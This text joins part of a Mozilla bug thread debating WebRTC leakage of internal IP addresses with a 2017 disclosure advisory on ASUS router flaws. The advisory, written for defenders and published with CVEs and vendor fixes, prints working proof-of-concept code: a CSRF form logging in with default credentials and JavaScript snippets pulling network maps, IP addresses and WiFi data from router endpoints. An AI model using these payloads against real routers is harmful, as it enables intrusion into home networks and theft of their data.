| [Comment 144](/show_bug.cgi?id=959893#c144)• 9 years ago |
|  | |

Put simply: You can't have a public boat in international waters, without acknowledging who's water you're in! =P

|  | [ABri](/user_profile?user_id=502378) |  |
| --- | --- | --- |
| [Comment 145](/show_bug.cgi?id=959893#c145)• 9 years ago |
| advocacy | |

| Comment hidden (advocacy) |  |
| --- | --- |

@Dave Andrews
It's two years now that me and many others tried to change the mind of mozilla developers on the issue - see the 140 comments on the bug above and make up your mind: privacy does not bother mozilla but market share does. Simply move on and use another browser.

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 146](/show_bug.cgi?id=959893#c146)• 9 years ago |
|  | |

This is the wrong place to have this discussion. Please take it to the IETF rtcweb WG.

|  | [brandmairstefan](/user_profile?user_id=534428) |  |
| --- | --- | --- |
| [Comment 147](/show_bug.cgi?id=959893#c147)• 9 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #146](/show_bug.cgi?id=959893#c146 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> This is the wrong place to have this discussion. Please take it to the IETF
> rtcweb WG.
Would you mind posting a link?

|  | [u442650](/user_profile?user_id=442650) |  |
| --- | --- | --- |
| [Comment 148](/show_bug.cgi?id=959893#c148)• 9 years ago |
| advocacy | |

| Comment hidden (advocacy) |  |
| --- | --- |

Posted for ABri (as i agree that this is not "ADVOCACY"):
Original Message:
"""
@Dave Andrews
It's two years now that me and many others tried to change the mind of mozilla developers on the issue - see the 140 comments on the bug above and make up your mind: privacy does not bother mozilla but market share does. Simply move on and use another browser.
"""

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 149](/show_bug.cgi?id=959893#c149)• 9 years ago |
|  | |

(In reply to Eric Rescorla (:ekr) from [comment #146](/show_bug.cgi?id=959893#c146 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> This is the wrong place to have this discussion. Please take it to the IETF
> rtcweb WG.
WG: <http://tools.ietf.org/wg/rtcweb/>
List archive at: <https://mailarchive.ietf.org/arch/search/?email_list=rtcweb>
The WG draft that contains the current WG recommendations: <https://tools.ietf.org/html/draft-ietf-rtcweb-ip-handling-01>
As Adam says in c141, the current plan of record for Firefox (and I believe other browsers as well) is to implement the recommendations in this specification, namely mode 2 if no permissions prompt is shown and mode 1 if permission has been granted (though this may just be cam/mic permission. text tbd). If people would like that to happen faster, the best way to accomplish that is to do one of the following
1. Review the specification and provide comments so that it is finalized sooner.
2. Provide a patch that updates Firefox to follow the current draft.
If you think that the recommendations in the draft are wrong, then you should also provide comments to the WG.

|  | [u279673](/user_profile?user_id=279673) |  |
| --- | --- | --- |
| [Comment 150](/show_bug.cgi?id=959893#c150)• 9 years ago |
| advocacy | |

| Comment hidden (advocacy) |  |
| --- | --- |

(In reply to Jared Null from [comment #148](/show_bug.cgi?id=959893#c148 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> Posted for ABri (as i agree that this is not "ADVOCACY"):
>
> Original Message:
>
> """
> @Dave Andrews
> It's two years now that me and many others tried to change the mind of
> mozilla developers on the issue - see the 140 comments on the bug above and
> make up your mind: privacy does not bother mozilla but market share does.
> Simply move on and use another browser.
> """
When I'm not using Tor, I've since moved on to GNU IceCat. Disable the LibreJS plugin, no-longer-needed HTML5 Video plugin, and HTTPS Everywhere plugin, enable prefetching through alt:config, and use RSS to be notified of browser updates. With these changes made to IceCat, only one Web site I use has given me problems, and it's still usable anyway.

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
| [Comment 151](/show_bug.cgi?id=959893#c151)• 9 years ago |
|  | |

@Eric Rescorla
(In reply to Eric Rescorla (:ekr) from [comment #149](/show_bug.cgi?id=959893#c149 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> (In reply to Eric Rescorla (:ekr) from [comment #146](/show_bug.cgi?id=959893#c146 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > This is the wrong place to have this discussion. Please take it to the IETF
> > rtcweb WG.
>
> As Adam says in c141, the current plan of record for Firefox (and I believe
> other browsers as well) is to implement the recommendations in this
> specification, namely mode 2 if no permissions prompt is shown and mode 1 if
> permission has been granted (though this may just be cam/mic permission.
> text tbd). If people would like that to happen faster, the best way to
> accomplish that is to do one of the following
>
> 1. Review the specification and provide comments so that it is finalized
> sooner.
> 2. Provide a patch that updates Firefox to follow the current draft.
>
> If you think that the recommendations in the draft are wrong, then you
> should also provide comments to the WG.
So, I understand this. I also understand that the IETF is asking Mozilla and other browsers to violate their own zoning restrictions by leveraging private resources from public contexts in both modes 1 and 2 -- regardless if the user approves of sharing a webcam or microphone. You've made this very observation yourself in the above comment.
So what is Mozilla's plan to address the zoning issue in order to adhere to their existing security requirements for public and private zoning? Should we just let websites start generating radio interference and traffic with our VMs as well?
At what point are we going to acknowledge that the user's LAN (and its routing facilities) are private resources?

|  | [Eric Rescorla (:ekr)](/user_profile?user_id=35667) |  |
| --- | --- | --- |
| [Comment 152](/show_bug.cgi?id=959893#c152)• 9 years ago |
|  | |

(In reply to Dave Andrews from [comment #151](/show_bug.cgi?id=959893#c151 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> @Eric Rescorla
> (In reply to Eric Rescorla (:ekr) from [comment #149](/show_bug.cgi?id=959893#c149 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > (In reply to Eric Rescorla (:ekr) from [comment #146](/show_bug.cgi?id=959893#c146 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> > > This is the wrong place to have this discussion. Please take it to the IETF
> > > rtcweb WG.
> >
> > As Adam says in c141, the current plan of record for Firefox (and I believe
> > other browsers as well) is to implement the recommendations in this
> > specification, namely mode 2 if no permissions prompt is shown and mode 1 if
> > permission has been granted (though this may just be cam/mic permission.
> > text tbd). If people would like that to happen faster, the best way to
> > accomplish that is to do one of the following
> >
> > 1. Review the specification and provide comments so that it is finalized
> > sooner.
> > 2. Provide a patch that updates Firefox to follow the current draft.
> >
> > If you think that the recommendations in the draft are wrong, then you
> > should also provide comments to the WG.
>
> So, I understand this. I also understand that the IETF is asking Mozilla
> and other browsers to violate their own zoning restrictions by leveraging
> private resources from public contexts in both modes 1 and 2 -- regardless
> if the user approves of sharing a webcam or microphone. You've made this
> very observation yourself in the above comment.
>
> So what is Mozilla's plan to address the zoning issue in order to adhere to
> their existing security requirements for public and private zoning? Should
> we just let websites start generating radio interference and traffic with
> our VMs as well?
>
> At what point are we going to acknowledge that the user's LAN (and its
> routing facilities) are private resources?
Adam already explained what we intend to do in c141 and then I explained it again in c149: mode 2 without user consent and mode 1 with user consent.
I realize that you think that this violates some principle, but that's not an opinion that I share or that as far as I know is shared by the Mozilla security/privacy teams.

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
| [Comment 153](/show_bug.cgi?id=959893#c153)• 9 years ago |
|  | |

> Adam already explained what we intend to do in c141 and then I explained it
> again in c149: mode 2 without user consent and mode 1 with user consent.
>
> I realize that you think that this violates some principle, but that's not
> an opinion that I share or that as far as I know is shared by the Mozilla
> security/privacy teams.
It DOES violate some principle, it violates a principle pointed out in the OFFICIAL WebRTC 1.0 W3C Spec
There's a section in WebRTC 1.0 that gets at this EXACT security concern:
<https://www.w3.org/TR/webrtc/#impact-on-local-network>
"Since the browser is an active platform executing in a trusted network environment (inside the firewall), it is important to limit the damage that the browser can do to other elements on the local network, and it is important to protect data from interception, manipulation and modification by untrusted participants."
"Mitigations include:
An UA will always request permission from the correspondent UA to communicate using ICE. This ensures that the UA can only send to partners who you have shared credentials with."
Though, because it looks like the spec they picked does THIS:
"dictionary RTCConfiguration {
sequence<RTCIceServer> iceServers;
RTCIceTransportPolicy iceTransportPolicy = "all";
RTCBundlePolicy bundlePolicy = "balanced";
RTCRtcpMuxPolicy rtcpMuxPolicy = "require";
DOMString peerIdentity;
sequence<RTCCertificate> certificates;
unsigned short iceCandidatePoolSize = 0;
};
iceTransportPolicy of type RTCIceTransportPolicy, defaulting to "all"
Indicates which candidates the ICE agent is allowed to use."
enum RTCIceTransportPolicy {
"public",
"relay",
"all"
};
public The ICE agent MUST filter out candidates with private IP addresses [RFC1918].
relay The ICE agent MUST only use media relay candidates such as candidates passing through a TURN server. This can be used to reduce leakage of IP addresses in certain use cases.
all The ICE agent may use any type of candidates when this value is specified.
^^ Then it is therefore IMPOSSIBLE to limit the damage to the local network without prompting the UA whether to permit all ICE connections every time they are needed. This protocol is digging its own grave by defaulting everything here to a mode called "abuse my network".
If Mozilla is not going to prompt the UA whether to allow ICE connections, then by the W3C and Mozilla's own admission: Mozilla has chosen to NOT limit its damage to other elements on the user's own network in its implementation of WebRTC.

|  | [Dave Andrews](/user_profile?user_id=382538) |  |
| --- | --- | --- |
| [Comment 154](/show_bug.cgi?id=959893#c154)• 9 years ago |
|  | |

There's a trivial way to fix this without breaking the UI horribly...
Change the default in that enum to "public" via "media.peerconnection.ice.default\_address\_only" (or some equivalent), and then prompt the user if the website manually specifies anything more invasive.
It will break spec, but it's not impractical given these serious security and privacy implications that that W3C points out about WebRTC.
This is the best workaround/middleground I can think of without implementing popups asking whether to permit the use of these insecure APIs every time they're needed.

|  | [Adam Roach [:abr]](/user_profile?user_id=241693) |  |
| --- | --- | --- |
| [Comment 155](/show_bug.cgi?id=959893#c155)• 9 years ago |
|  | |

(In reply to Dave Andrews from [comment #153](/show_bug.cgi?id=959893#c153 "NEW - [meta] WebRTC Internal IP Address Leakage"))
> This protocol is digging its own grave by defaulting everything here to a mode called "abuse my network".
As EKR pointed out, this conversation should be taken to the IETF RTCWEB mailing list. He provided pointers in [comment 149](/show_bug.cgi?id=959893#c149 "NEW - [meta] WebRTC Internal IP Address Leakage").
Two bits of advice when engaging on that list: (1) histrionics will generally not get you much headway; and (2) if you're raising a security issue, you really need to do it in the form of a threat model. Identify and describe potential attacks, the ease of mounting them, and the consequences of successfully mounting them.

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Comment 156](/show_bug.cgi?id=959893#c156)• 9 years ago |
|  | |

As people have repeatedly pointed out, discussion should happen on relevant mailing lists. Spamming this bug with repeated comments isn't helpful. I'm restricting comments on this bug to avoid this and ensure people contact the relevant mailing lists / groups instead of commenting here.Restrict Comments: true

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a71239370_159069)• 9 years ago |

Restrict Comments: false

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a71239761_159069)• 9 years ago |

Restrict Comments: true

|  | [Ethan Tseng [:ethan]](/user_profile?user_id=473897) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a94315733_473897)• 8 years ago |

Blocks: [uplift\_tor\_fingerprinting](/show_bug.cgi?id=1329996 "NEW - [META] Tor Uplift: Fingerprinting Resistance")

|  | [Aaron Wu](/user_profile?user_id=472477) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a95558149_472477)• 8 years ago |

No longer blocks: [uplift\_tor\_fingerprinting](/show_bug.cgi?id=1329996 "NEW - [META] Tor Uplift: Fingerprinting Resistance")

|  | [Ethan Tseng [:ethan]](/user_profile?user_id=473897) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a121652876_473897)• 7 years ago |

Whiteboard: [fingerprinting] → [fingerprinting][fp-triaged]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a142782954_578488)• 7 years ago |

See Also: → [1466148](/show_bug.cgi?id=1466148 "NEW - WebRTC leaks internal addresses even when camera/mic permissions are not granted")

|  | [Ethan Tseng [:ethan]](/user_profile?user_id=473897) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a152550455_473897)• 6 years ago |

Whiteboard: [fingerprinting][fp-triaged] → [fingerprinting]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a152638568_578488)• 6 years ago |

Whiteboard: [fingerprinting] → [fingerprinting][fp-triaged]

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a153066174_575867)• 6 years ago |

Summary: WebRTC Internal IP Address Leakage → [meta] WebRTC Internal IP Address Leakage

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581) |  |
| --- | --- | --- |
| [Comment 160](/show_bug.cgi?id=959893#c160)• 4 years ago |
|  | |

I believe with mDNS used in host candidates this no longer warrants such high severity.

Severity: critical → S3

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Comment 161](/show_bug.cgi?id=959893#c161)• 4 years ago |
|  | |

Can you please explain? Are you saying that there's no way that IP addresses leak to the site anymore? If so, why do you believe that?

|  | [Ben Bucksch (:BenB)](/user_profile?user_id=22599) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=959893#a225643045_22599)• 4 years ago |

Flags: needinfo?(drno)

|  | [Nils Ohlmeier [:drno]](/user_profile?user_id=489581) |  |
| --- | --- | --- |
| [Comment 162](/show_bug.cgi?id=959893#c162)• 3 years ago |
|  | |

(In reply to Ben Bucksch (:BenB) from [comment #161](/show_bug.cgi?id=959893#c161 "NEW - [meta] WebRTC Internal IP Address Leakage"))

> Can you please explain? Are you saying that there's no way that IP addresses leak to the site anymore? If so, why do you believe that?

With mDNS ICE candidate are still being given to the website. But the ICE candidate no longer contain private IP addresses.

Flags: needinfo?(drno)
You need to [log in](/show_bug.cgi?id=959893&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [cghwong](/user_profile?user_id=495629)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from wwws.nightwatchcybersecurity.com_cedf6da4_20250126_024813.html ===

[Skip to content](#content)
[![](https://wwws.nightwatchcybersecurity.com/wp-content/uploads/2016/06/1-coojnfoayruptsimgys6tw.png?w=140)](https://wwws.nightwatchcybersecurity.com/)
# [Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/)

## Cybersecurity services and research

Menu

* [Home](https://wwws.nightwatchcybersecurity.com/)
* [Blog](https://wwws.nightwatchcybersecurity.com/blog/)
* [Presentations](https://wwws.nightwatchcybersecurity.com/presentations/)
* [Tools](https://wwws.nightwatchcybersecurity.com/tools/)
* [Contact](https://wwws.nightwatchcybersecurity.com/contact/)

[Home](https://wwws.nightwatchcybersecurity.com/)Multiple Vulnerabilities in ASUS Routers
# Multiple Vulnerabilities in ASUS Routers

[May 9, 2017January 30, 2018](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/) [nightwatchcyber](https://wwws.nightwatchcybersecurity.com/author/nightwatchcyber/)
[Advisories](https://wwws.nightwatchcybersecurity.com/category/advisories/)[asus](https://wwws.nightwatchcybersecurity.com/tag/asus/), [csrf](https://wwws.nightwatchcybersecurity.com/tag/csrf/), [jsonp](https://wwws.nightwatchcybersecurity.com/tag/jsonp/), [routers](https://wwws.nightwatchcybersecurity.com/tag/routers/)

## Summary

Various models of ASUS RT routers have several CSRF vulnerabilities allowing malicious sites to login and change settings in the router; multiple JSONP vulnerabilities allowing exfiltration of router data and an XML endpoint revealing WiFi passwords.

Most of these issues have been fixed by Asus in the March 2017 firmware update under v3.0.0.4.380.7378. One issue (JSONP information disclosure – CVE-2017-5892) remains unfixed since the vendor doesn’t consider it to be a security threat **[UPDATE: Asus will be fixing this]**

CVE-2017-5891 has been assigned to the CSRF issues, and CVE-2017-5892 to cover the JSONP disclosure without login issue. **[ADDED 05/11/2017: Two additional CVEs have been issued to cover JSONP issues after login – CVE-2017-8877 – and the XML information disclosure issue – CVE-2017-8878].**

**[ADDED 05/28/2017: As reported in comments below, multiple other models may be affected; please review the list below for details on what is affected, and whether patches are available]**

## Vulnerability Details

RT routers from ASUS like many other routers come with a built-in web interface accessible over the local network but normally not accessible via the Internet. We discovered multiple issues within that web interface that would can facilitate attacks on the router either via a malicious site visited by a user on the same network, or a malicious mobile or desktop application running on the same network.

For the CSRF vulnerabilities, a user would need to visit a malicious site which can try to login and change settings. For the JSONP vulnerabilities, a website can load the JSONP endpoints via SCRIPT tags as long as matching function name is defined on that site. The XML endpoint requires a mobile or desktop application to exploit.

NOTE: all of these assume that the attacker knows the local IP address of the router. This could probably be guessed or be determined via Javascript APIs like [WebRTC](https://bugzilla.mozilla.org/show_bug.cgi?id=959893). For desktop and mobile applications, determination of the gateway address should be trivial to implement.

### **Issue #1 – Login Page CSRF (CVE-2017-5891)**

The login page for the router doesn’t have any kind of CSRF protection, thus allowing a malicious website to submit a login request to the router without the user’s knowledge. Obviously, this only works if the site either knows the username and password of the router OR the user hasn’t changed the default credentials (“admin / admin”). To exploit, submit the base-64 encoded username and password as “**login\_authorization”** form post, to the “**/login.cgi**” URL of the browser.

Example of a form that can exploit this issue (uses default credentials):

> ```
> <form action="http://192.168.1.1/login.cgi"
>    method="post" target="_blank">
> <input name="login_authorization" type="text"
>    value="YWRtaW46YWRtaW4=" />
> <input type="submit" /></form>
> ```

### **Issue #2 – Save Settings CSRF (CVE-2017-5891)**

The various pages within the interface that can save settings do not have CSRF protection. That means that a malicious site, once logged in as described above would be able to change any settings in the router without the user’s knowledge.

**NOTE: We have not been to exploit this issue consistently**

### Issue #3 – JSONP Information Disclosure Without Login (CVE-2017-8877)

Two JSONP endpoints exist within the router which allow detection of which ASUS router is running and some information disclosure. No login is required to the router. **The vendor doesn’t consider these endpoints a security threat.** [ADDED 05/11/2017: A project named [Sonar.JS](https://github.com/mandatoryprogrammer/sonar.js/tree/master) exists on Github that describes how to use this with WebRTC to figure out which router the user is running, This project is an example of what is possible with an end point like this one].

The endpoints are as follows:

* /findasus.json
  + Returns the router model name, SSID name and the local IP address of the router
    - iAmAlive([{model?Name: “XXX”, ssid: “YYY”, ipAddr: “ZZZZ”}])
* /httpd\_check.json
  + Returns: {“alive”: 1, “isdomain”: 0}

Exploit code as follows:

> ```
> function iAmAlive(payload) {
>   window.alert("Result returned: " + JSON.stringify(payload));
> }
> function alert1() {
>   var script = document.createElement('script');
>   script.src = 'http://192.168.1.1/findasus.json'
>   document.getElementsByTagName('head')[0].appendChild(script);
> }
> function alert2() {
>   var script = document.createElement('script');
>   script.src = 'http://192.168.1.1/httpd_check.json'
>   document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> ```

### Issue #4 – JSONP Information Disclosure, Login Required (CVE-2017-5892)

There exist multiple JSONP endpoints within the router interface that reveal various data from the router including.

Below is a list of endpoints and exploit code:

**/status.asp – Network Information**

> ```
> function getstatus() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/status.asp'
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
> function show_wanlink_info() {
>     var obj = {};
>     obj.status = wanlink_status();
>     obj.statusstr = wanlink_statusstr();
>     obj.wanlink_type = wanlink_type();
>     obj.wanlink_ipaddr = wanlink_ipaddr();
>     obj.wanlink_xdns = wanlink_xdns();
>     window.alert(JSON.stringify(obj));
> }
>
> <br/>
> <button onClick="getstatus()">Load Status script</button>
> <button onClick="show_wanlink_info()">Show wanlink info</button>
> <br/><br/>
> ```

**/wds\_aplist\_2g.asp – Surrounding Access points, 2.4 Ghz band**

**/wds\_aplist\_5g.asp – Surrounding Access points, 5 Ghz band**

```
function getwds_2g() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/wds_aplist_2g.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}
function getwds_5g() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/wds_aplist_5g.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getwds_2g()">Load 2G info</button>
<button onClick="getwds_5g()">Load 5G info</button>
<button onClick="window.alert(JSON.stringify(wds_aplist))">Show AP info</button>
<br/><br/>
```

**/update\_networkmapd.asp – Network map of devices on the network**

> ```
> function getmap() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/update_networkmapd.asp'
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> <br/>
> <button onClick="getmap()">Load Network map</button>
> <button onClick="window.alert(JSON.stringify(fromNetworkmapd))">Show Map</button>
> <br/><br/>
> ```

**/update\_clients.asp – Origin data**

```
function getorigin() {
    originData = [];
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/update_clients.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getorigin()">Load Origin</button>
<button onClick="window.alert(JSON.stringify(originData))">Show Origin</button>
```

**/get\_real\_ip.asp – External IP address**

```
function getrealip() {
    var script = document.createElement('script');
    script.src = 'http://192.168.1.1/get_real_ip.asp'
    document.getElementsByTagName('head')[0].appendChild(script);
}

<br/>
<button onClick="getrealip()">Load IP</button>
<button onClick="window.alert(JSON.stringify(wan0_realip_ip))">Show IP</button>
```

**/get\_webdavInfo.asp – WebDAV information**

> ```
> function getwebdav() {
>     var script = document.createElement('script');
>     script.src = 'http://192.168.1.1/get_webdavInfo.asp';
>     document.getElementsByTagName('head')[0].appendChild(script);
> }
>
> <br/>
> <button onClick="getwebdav()">Load WebDav</button>
> <button onClick="window.alert(JSON.stringify(pktInfo))">Show Info 1</button>
> <button onClick="window.alert(JSON.stringify(webdavInfo))">Show Info 1</button>
> <br/><br/>
> ```

### Issue #5 – XML Endpoint Reveals WiFi Passwords (CVE-2017-8878)

An XML endpoint exists in the router which reveals the WiFi password to the router but to fully exploit this issue, it would require a mobile or desktop application running on the local network since XML cannot be loaded cross origin in the browser. This endpoint can be accessed at the following URL and requires login:

> ```
> [router IP]/WPS_info.xml
>
> ```

## Mitigation Steps / Vendor Response

Users should change the default credentials and apply the latest firmware released by ASUS, version v3.0.0.4.380.7378 or higher **(except for 4G-AC55U which has no patches available).**

 **There is no mitigation available for the issue #3 – JSONP information disclosure without login.**

Affected models include the following ASUS routers **and is not exhaustive**:

* **4G-AC55U – [ADDED 05/10/2017, patches are available as of 06/13/2017]**
* RT-AC51U
* RT-AC52U B1 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC53 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC53U
* RT-AC55U
* RT-AC56R
* RT-AC56S
* RT-AC56U
* **RT-AC58U – [ADDED 05/28/2017: As reported by a commenter below, this one is also affected] [ADDED 06/15/2017 – firmware update now available]**
* RT-AC66U
* RT-AC68U
* RT-AC68UF – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC66R
* RT-AC66U
* RT-AC66W
* RT-AC68W
* RT-AC68P
* RT-AC68R
* RT-AC68U
* RT-AC87R
* RT-AC87U
* RT-AC88U – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1200 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1750 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-AC1900P
* RT-AC3100
* RT-AC3200
* RT-AC5300
* **RT-AC1200G+ – [ADDED 06/15/2017: based on a comment below]**
* **RT-ACRH13 – [ADDED 05/28/2017: As reported by a commenter below, this one is also affected and has no patches]**
* RT-N11P
* RT-N12 (D1 version only)
* RT-N12+
* RT-N12E
* RT-N16 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-N18U
* RT-N56U
* RT-N66R – [07/20/2017 – as per commenter below, new firmware was released on July 17th, 2017 – v3.0.0.4.380.7743]
* RT-N66U (B1 version only)
* RT-N66W
* RT-N300 – [ADDED 05/10/2017 based on Asus Firmware updates]
* RT-N600 – [ADDED 05/10/2017 based on Asus Firmware updates]

## References

CVE-IDs: [CVE-2017-5891](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5891), [CVE-2017-5892](http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2017-5892), [CVE-2017-8877](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8877) and [CVE-2017-8878](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8878)

CERT/CC Tracking # VR-627

## Credits

We would like to thank CERT/CC for helping to coordinate the disclosure process. This advisory was written by Yakov Shafranovich.

# Timeline

2017-01-21: Initial contact with the vendor

2017-01-23: Initial contact with CERT/CC

2017-02-05: Vulnerability details and POC code provided to the vendor, CVEs requested

2017-02-10: Vulnerability analysis received from the vendor

2017-02-12: Beta firmware provided by the firmware to test fixes

2017-02-12: Vendor fixes confirmed

2017-03-31: Fixed firmware released publicly by the vendor

2017-05-01: Draft advisory shared with the vendor and CERT/CC

2017-05-09: Public disclosure

### Share this:

* [Twitter](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?share=twitter "Click to share on Twitter")
* [Facebook](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?share=facebook "Click to share on Facebook")
Like Loading...

# Post navigation

[← Advisory: ChromeOS / ChromeBooks Persist Certain Network Settings in Guest Mode](https://wwws.nightwatchcybersecurity.com/2017/04/09/advisory-chromeos-chromebooks-persist-certain-network-settings-in-guest-mode/) [Advisory: Google I/O 2017 Android App Doesn’t Use SSL for Some Content [CVE-2017-9045] →](https://wwws.nightwatchcybersecurity.com/2017/05/17/advisory-google-io-2017-android-app/)

## 24 thoughts on “Multiple Vulnerabilities in ASUS Routers”

1. ![](https://0.gravatar.com/avatar/fd773bbe8b26f032726a92e4ce554233b12f160787b9b9ed836327d2c25bdfe3?s=60&d=identicon&r=G) **ng** says:
   [May 10, 2017 at 3:40 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-230)

   The Asus 4G-AC55U router is also affected by the issues listed in the article but it did not receive a firmware fix.

   The router is based on the same AsusWRT firmware as the RT series, just has a 4G LTE modem built in. The latest version 3.0.0.4.378.8150 was published a year ago on 2016-05-20 on the download page at <https://www.asus.com/Networking/4G-AC55U/HelpDesk_Download/>.

   I tested all the vulnerabilities listed above and can confirm they are present.

   Please update the article to warn the 4G-AC55U owners and pass this information to the vendor if possible.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=230#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 10, 2017 at 9:03 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-234)

     We will take a look and update accordingly. Thank you for the information.

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=234#respond)
3. ![](https://0.gravatar.com/avatar/f054ce4e2e4fe8810322d414b88517af05a846599aab8372975eb0cfadd10c11?s=60&d=identicon&r=G) **asdf** says:
   [May 11, 2017 at 2:32 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-239)

   The JSONP Information Disclosure looks more like Cross-Site Script Inclusion (XSSI) as the URLs do not accept a user supplied callback parameter.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=239#respond)
5. **[Advisory: CVE-2017-5891 and CVE-2017-5892 (Pending) | Nightwatch Cybersecurity](https://wwws.nightwatchcybersecurity.com/2017/03/08/advisory-cve-2017-5891-and-cve-2017-5892-pending/)** says:
   [May 11, 2017 at 11:29 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-256)

   […] This has been published here. […]

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=256#respond)
7. ![](https://1.gravatar.com/avatar/df2173310eedabe90916687ac7d0e3891a25bd66247bdcb5b619c7583023276f?s=60&d=identicon&r=G) **Major** says:
   [May 12, 2017 at 7:10 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-260)

   RT-N56U last firmware update was 1/12/2017 as ver. 3.0.0.4.376.3754

   but im running ver. 3.0.0.4.378\_4850 (more current than official?)

   wondering if im hacked?

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=260#respond)
   * ![](https://1.gravatar.com/avatar/1f715cc6357c26b7e89f8ace9af99598bcda87e5105eb2dc30474167241e15d1?s=60&d=identicon&r=G) **nightwatchcyber** says:
     [May 13, 2017 at 11:36 pm](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-264)

     Not sure, sounds like it needs to be higher than v3.0.0.4.380.7378 and yours isn’t

     [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=264#respond)
9. ![](https://0.gravatar.com/avatar/3b712b9391d45badf98355fed652d8be8d0ef4c7c837d7a6f08a390f9fc8b04f?s=60&d=identicon&r=G) **PATRICK CHANG** says:
   [May 13, 2017 at 7:24 am](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/#comment-262)

   Can I assume the T-Mobile version of the RT-AC1900 is also affected – TM-AC1900? Its firmware remains at stuck at an earlier version.

   [Reply](https://wwws.nightwatchcybersecurity.com/2017/05/09/multiple-vulnerabilities-in-asus-routers/?replytocom=262#respond)
